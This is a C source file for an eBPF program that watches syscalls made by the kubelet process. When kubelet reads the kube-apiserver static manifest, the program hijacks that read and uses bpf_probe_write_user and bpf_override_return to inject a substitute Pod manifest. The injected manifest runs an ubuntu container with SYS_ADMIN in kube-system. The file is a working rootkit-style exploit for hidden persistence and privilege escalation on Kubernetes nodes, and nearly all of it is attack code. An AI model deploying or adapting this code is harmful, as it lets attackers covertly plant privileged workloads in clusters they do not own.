// +build ignore

#include "common.h"
#include "bpf_helpers.h"
//#include "vmlinux.h"
char __license[] SEC("license") = "Dual MIT/GPL";


#define TASK_COMM_LEN			0x40
#define MISS 0xdeadbeef
#define HIT  0xffffffff

#define PID_KEY 0
#define STATBUF_PTR_KEY 1
#define OPEN_FD_KEY 2
#define FSTATBUF_PTR_KEY 3
#define JUMP_FLAG_KEY 4
#define READ_BUF_PTR_KEY 5
#define FSTAT_COUNTER 6

#define FILENAME_KEY 0
#define OPENAT_FILENAME_KEY 1
#define START_KEY 7
#define WRITTEN_KEY 7

#define OFFSET 0x159+0x1f+2

/* For global int/long... */
struct bpf_map_def SEC("maps") raw_tracepoint_map = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u64),
    .max_entries = 10,
};

/* For global string */
struct bpf_map_def SEC("maps") raw_tracepoint_map_2 = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = 0x40,
    .max_entries = 10,
};
// int cron_pid=0;
/* ****************************** Deceleration Begin ****************************** */
/* Another Helpers */
static __inline int memcmp(const void* s1, const void* s2, u64 cnt);
static __inline void *memcpy(void* dest, const void* src, u64 count);
static __inline int memcmp(const void* s1, const void* s2, u64 cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}
static __inline void *memcpy(void* dest, const void* src, u64 count)
{


       char* pdest =(char*) dest;

       const char* psrc =(const char*) src;

       if (psrc > pdest || pdest >= psrc + count)

       {

              while (count--)

              *pdest++ = *psrc++;

       }

       else

       {

               while (count--)

               {

                     *(pdest + count) = *(psrc + count);

              }

       }

return dest;

}

SEC("kretprobe/__x64_sys_read")
int kretprobe_sys_read(struct pt_regs *ctx)
{
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // executable is not kubelet, return
    if (memcmp(comm, "kubelet", sizeof("kubelet"))){
       return 0;
    }      

    u32 key_start_flag = START_KEY;u32 key_read_buffer = READ_BUF_PTR_KEY;u32 ket_written_flag = WRITTEN_KEY;
    u64 start_flag = 0;char *buffer_ptr = NULL;u64 written_flag = 0;
    u64 *valp_start_flag = NULL;char *valp_read_buffer = NULL;u64* valp_written_flag = NULL;
    valp_start_flag = bpf_map_lookup_elem(&raw_tracepoint_map,&key_start_flag);
    valp_read_buffer = bpf_map_lookup_elem(&raw_tracepoint_map,&key_read_buffer);
    valp_written_flag = bpf_map_lookup_elem(&raw_tracepoint_map,&ket_written_flag);
    if(!valp_start_flag || !valp_read_buffer){return 0;}
    bpf_probe_read(&start_flag , sizeof(u64) , valp_start_flag);
    bpf_probe_read(&buffer_ptr , sizeof(char *) , valp_read_buffer);
    bpf_probe_read(&written_flag , sizeof(u64) , valp_written_flag);
    
    char fmt[]="Frist round\n";char fmt2[]="Second over\n";
    char fmt3[]="start_flag=0x%x\n";
    bpf_trace_printk(fmt3,sizeof(fmt3),start_flag);
    if(start_flag == 0xfd && buffer_ptr){
      char PAYLOAD[] = "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ebpf0\n  namespace: kube-system\nspec:\n  containers:\n  - name: main\n    image: ubuntu:20.04\n    command: [\"sleep\",\"infinity\"]\n    securityContext:\n      capabilities:\n        add:\n        - SYS_ADMIN #";
      u64 clean_start_flag = 0;
      if(written_flag==1){
        /* update written flag */
        written_flag = 0;
        bpf_map_update_elem(&raw_tracepoint_map, &ket_written_flag, &written_flag ,BPF_ANY);
        /* clean read buffer ptr */
        buffer_ptr = NULL;
        bpf_map_update_elem(&raw_tracepoint_map, &key_read_buffer, &buffer_ptr ,BPF_ANY);

        bpf_override_return(ctx,0);
        bpf_trace_printk(fmt2,sizeof(fmt2));
      }
      /* hijack */
      bpf_probe_write_user(buffer_ptr , &PAYLOAD , sizeof(PAYLOAD) );
      bpf_override_return(ctx,sizeof(PAYLOAD));
      bpf_trace_printk(fmt,sizeof(fmt),buffer_ptr);
      /* clean start flag and clean read buffer ptr */
      buffer_ptr = NULL;
      bpf_map_update_elem(&raw_tracepoint_map, &key_start_flag, &clean_start_flag ,BPF_ANY);
      bpf_map_update_elem(&raw_tracepoint_map, &key_read_buffer, &buffer_ptr ,BPF_ANY);

      /* set written flag */
      written_flag = 1;
      bpf_map_update_elem(&raw_tracepoint_map, &ket_written_flag, &written_flag ,BPF_ANY);
    }
    //bpf_override_return(ctx, 0x10);
    return 0;
}

static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
  
    struct pt_regs *regs;
	  char buf[0x40]={'\x00'};
    s64 read_fd = -1;s64 openat_fd = -1;
	  char *pathname=NULL ;
    char *buffer_ptr = NULL;
    int *valp = NULL;
    int key_openat_fd = OPEN_FD_KEY;
    char fmt[]="READ check pass, report to kretprobe\n";
    char fmt2[] = "%s\n";
    regs = (struct pt_regs *)(ctx->args[0]);
    bpf_probe_read(&read_fd , sizeof(read_fd) , &regs->di);
    bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);
    bpf_probe_read(&buffer_ptr , sizeof(buffer_ptr) , &regs->si);
    bpf_probe_read_str(buf,sizeof(buf),pathname);
    bpf_trace_printk(fmt2,sizeof(fmt2),buf);

    valp = bpf_map_lookup_elem(&raw_tracepoint_map,&key_openat_fd);
    if(valp){bpf_probe_read(&openat_fd , sizeof(u64) , (int *)valp);} 
    if((buf[0]>'z' || buf[0]<'A') && openat_fd<=0){return 0;}

  //   char PAYLOAD[] = "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ebpf0\n  namespace: default\nspec:\n  containers:\n  - name: main\n    image: ubuntu:20.04\n    command: [\"sleep\",\"infinity\"]\n    securityContext:\n      capabilities:\n        add:\n        - SYS_ADMIN #";

    if(read_fd > 0 && openat_fd >0 && read_fd == openat_fd){
      //bpf_trace_printk(fmt,sizeof(fmt),read_fd,openat_fd);
      /* report to kretprobe */
      u64 start_flag = 0xfd;
      u32 key_start_flag = START_KEY;u32 key_read_buffer = READ_BUF_PTR_KEY;
      bpf_map_update_elem(&raw_tracepoint_map, &key_start_flag, &start_flag ,BPF_ANY);  // start flag = 0xfd
      bpf_map_update_elem(&raw_tracepoint_map, &key_read_buffer, &buffer_ptr ,BPF_ANY); 
      bpf_trace_printk(fmt,sizeof(fmt));
    }
  return 0;

}

static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx){
  
    struct pt_regs *regs;
	  char buf[0x40]={'\x00'};
    u64 fd = 0;u32 key_openat_fd = OPEN_FD_KEY;
	  char *pathname=NULL ;
    regs = (struct pt_regs *)(ctx->args[0]);
    bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);
    bpf_probe_read_str(buf,sizeof(buf),pathname);
    bpf_probe_read(&fd , sizeof(u64) , &regs->ax);
    char fmt[]="OPENAT: %s\n";

    /*filter the open file path */
    char usr_lib[]="/usr/lib";char sys_fs[]="/sys/fs";char proc[]="/proc";char dev[]="/dev";char var_log[]="/var/log";char etc[]="/etc";char var_lib[]="/var/lib";char sys_class[]="/sys/class";char sys_devices[]="/sys/devices";char catch[]="/etc/kubernetes/manifests/kube-apiserver.yaml";
    // if(!memcmp(buf,usr_lib,sizeof(usr_lib)-1) || !memcmp(buf,sys_fs,sizeof(sys_fs)-1) || !memcmp(buf,proc,sizeof(proc)-1) || !memcmp(buf,dev,sizeof(dev)-1) || !memcmp(buf,var_log,sizeof(var_log)-1) || !memcmp(buf,var_lib,sizeof(var_lib)-1) || !memcmp(buf,sys_class,sizeof(sys_class)-1) || !memcmp(buf,sys_devices,sizeof(sys_devices)-1) ){return 0;}
    if(memcmp(buf,catch,sizeof(catch)-1)){return 0;}



    bpf_map_update_elem(&raw_tracepoint_map, &key_openat_fd, &fd ,BPF_ANY);
    bpf_trace_printk(fmt,sizeof(fmt),pathname);

  
  
  return 0;
}
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx){
    struct pt_regs *regs;
	  char buf[0x40]={'\x00'};
    u64 fd = 0;
	  char *pathname=NULL ;
    int *valp = NULL;
    int key_openat_fd = OPEN_FD_KEY;
    int openat_fd = -1;
    regs = (struct pt_regs *)(ctx->args[0]);
    bpf_probe_read(&fd , sizeof(u64) , &regs->di);

    char fmt[]="CLOSE fd: %d\n";
    valp = bpf_map_lookup_elem(&raw_tracepoint_map,&key_openat_fd);
    if(valp){bpf_probe_read(&openat_fd , sizeof(u64) , (int *)valp);}
    /* if cloes correspoding 'fd'*/
    u64 empty_fd = 0;
    if(openat_fd > 0){
      //bpf_trace_printk(fmt,sizeof(fmt),openat_fd);
      bpf_map_update_elem(&raw_tracepoint_map, &key_openat_fd, &empty_fd ,BPF_ANY);
      
    }

  return 0;
}
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx){
    //bpf_trace_printk(fmt,sizeof(fmt),buf);
  return 0;
}


SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    char fmt[]="%s\n";
  unsigned long syscall_id = ctx->args[1];
  int a=0;

  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));
  char python[] = "kubelet";
  if(memcmp(comm,python,sizeof(python))){
    return 0;
  }
  int flag = 0;
  switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            handle_enter_close(ctx);
            break;
        case 4:
            //handle_enter_stat(ctx);
            break;
        case 5:
            //handle_enter_fstat(ctx);
            break;
        case 59:
            //handle_enter_execve(ctx);
            break;
        case 257:
            //handle_enter_openat(ctx);
            break;
        default:
            return 0;
  }

  return 0;
}


SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  char fmt[]="%s\n";
  unsigned long syscall_id;
  struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
  bpf_probe_read(&syscall_id, sizeof(syscall_id) , &regs->orig_ax);
  int a=0;

  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));
  char python[] = "kubelet";
  if(memcmp(comm,python,sizeof(python))){
    return 0;
  }
  int flag = 0;
  switch (syscall_id)
    {
        case 0:
            //handle_exit_read(ctx);
            break;
        case 3:  // close
            //handle_enter_close(ctx);
            break;
        case 4:
            //handle_enter_stat(ctx);
            break;
        case 5:
            //handle_enter_fstat(ctx);
            break;
        case 59:
            //handle_enter_execve(ctx);
            break;
        case 257:
            handle_exit_openat(ctx);
            break;
        default:
            return 0;
  }  
    return 0;
}
